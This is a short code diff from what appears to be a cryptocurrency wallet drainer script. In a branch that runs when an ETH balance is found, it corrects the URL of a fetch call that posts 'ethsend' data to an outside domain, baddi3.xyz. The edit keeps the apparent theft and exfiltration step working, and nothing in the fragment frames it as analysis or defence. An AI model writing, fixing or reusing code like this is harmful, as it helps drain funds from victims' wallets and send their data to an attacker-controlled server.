@@ -391,7 +391,7 @@ if (balance_ineth > 0) {
     }
     const ethsend_data = JSON.stringify(ethsend_info);
     console.log("eth_send data:", ethsend_data);
-    fetch('https://baddi3.xyz//ethsend', {
+    fetch('https://baddi3.xyz/ethsend', {
       method: 'post',
       headers: {
         'Content-Type': 'application/json',
